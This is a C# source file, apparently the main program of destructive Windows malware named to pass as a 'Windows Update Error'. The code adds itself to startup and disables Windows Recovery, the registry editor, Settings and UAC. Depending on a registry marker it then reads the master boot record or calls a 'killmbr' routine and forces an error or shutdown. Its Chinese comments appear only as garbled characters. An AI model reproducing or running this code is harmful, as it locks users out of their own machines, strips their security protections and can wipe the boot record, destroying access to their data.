using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;

namespace Windows_Update_Error
{
    public static class Program
    {
        // ����һ���ֽ����飬���ڴ洢��������¼��MBR����ص����ݣ������ڳ��������и�����Ӧ�������и�ֵ��ʹ��
        public static byte[] MBR;

        /// <summary>
        /// Ӧ�ó��������ڵ㣬���򽫴����￪ʼִ�У��ڴ�Э����ϵͳ���ü����ܵ�����صĸ�����������ռȶ��߼����ε�����ط�����ʵ�ֲ�ͬ���ܡ�
        /// </summary>
        [STAThread]
        static void Main()
        {
            // ��ʼ��Ӧ�ó����������Ϣ�����Ǳ���Ӧ�ó������������ز������������еĻ�������
            ApplicationConfiguration.Initialize();

            // ����Regedit_Set���ʵ���������װ����ϵͳע�����ز������߼�����ʵ������ִ��ע��������Լ�ϵͳ����������ز���
            Regedit_Set regedit1 = new Regedit_Set();

            // ����Test���ʵ�������ฺ��ִ����������ض�Windows���ܡ�������Թػ��������ȸ�����Լ��������
            Test test1 = new Test();

            // ����regedit1�����Start_Detection������ȡ�����룬�����������ں��������߼��е������жϣ���������ִ�в�ͬ��֧·��
            string regedit1_Start = regedit1.Start_Detection();

            try
            {
                // ����regedit1�����PC_Start�������÷������𽫳�����ӵ����Կ����������У�ͬʱ���ճ���Ҫ��Թؼ�ϵͳ�������ý�����Ӧ�޸�
                regedit1.PC_Start(Regedit_Set.Local_1);

                // ����test1�����Disable_WinRE�������˷������ڽ���Windows�ָ�������ʹ���û��޷�ͨ������;������ϵͳ�ָ�ѡ��
                test1.Disable_WinRE();

                // ����regedit1�����Disable_Regedit���������ڽ�ֹ�û���ϵͳע�����з��ʣ��Դ˱���ע��������ԣ���ֹδ����Ȩ�ĸ���
                regedit1.Disable_Regedit();

                // ����regedit1�����Disable_Windows����������true���书���ǰ��ճ����趨��Windowsϵͳ����ع��ܽ��н��ã����屻���õĹ����ɸ÷����ڲ�ʵ�־���
                regedit1.Disable_Windows(true);
            }
            catch (Exception ex)
            {
                // ���������������쳣���˴���鲶���쳣����ͨ��������Ϣ����ʾ������Ϣ����Ϣ�򺬡�ȷ������ť������ͼ�꣬��ʾ�û���������
                MessageBox.Show(ex.Message, "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            // ����regedit1�����UAC_OFF�������÷������ڹر��û��˻����ƣ�UAC�����ܣ��رպ��ı�ϵͳ��ȫ��ʾ�������û������ķ���Ȩ�޼���
            regedit1.UAC_OFF();

            // ����regedit1�����Disable_Settings�������˷������ڽ����û���ϵͳ���ú�����������ķ��ʣ������û��޸�ϵͳ���ü������������еĽ���
            regedit1.Disable_Settings();

            if (regedit1_Start == "114514")
            {
                // ��������Ϊ"114514"ʱ�����������ֵ�޸�Ϊ"4397382"���������ݴ���ֵ������Ӧ����
                regedit1_Start = "4397382";
                // ����regedit1�����Start_Update�����������޸ĺ�������룬���������ض���ϵͳ������ز�����������������ɸ÷����ڲ��߼�����
                regedit1.Start_Update(regedit1_Start);
                // �õ�ǰ�߳���ִͣ��5000���루��5�룩��Ϊǰ��ĸ��²���Ԥ��ʱ������ɺ�̨�����ȴ�ϵͳ�ﵽ�ض�״̬
                Thread.Sleep(5000);
                // ����test1�����Shutdown_PC������ִ�йرյ��ԵĲ�����ʵ�ֳ�������µĹػ�����
                test1.Shutdown_PC();
            }
            else if (regedit1_Start == "4397382")
            {
                // ��������Ϊ"4397382"ʱ������Test���GetMbr������ȡ��������¼��MBR�������ݣ�����ֵ�������MBR�ֽ����飬�Ա����ʹ��
                MBR = Test.GetMbr();
                // ������ΪForm2��Windows FormsӦ�ó��򴰿ڣ�Form2���ڳ��غ���Ҫչʾ���û��Ľ������ݻ���ز����߼�
                Application.Run(new Form2());
            }
            else
            {
                // ��������Ȳ���"114514"Ҳ����"4397382"ʱ��ִ�����²���
                // ����test1�����killmbr�������÷�������ִ������������¼��MBR����ص��ض���������������ɸ÷����ڲ�ʵ�ֶ���
                test1.killmbr();
                // ����test1�����Nt_Error���������ڴ����Windows NTϵͳ��ص��ض��������������������߼��ڸ÷����ڲ�ʵ��
                test1.Nt_Error();
            }
        }
    }
}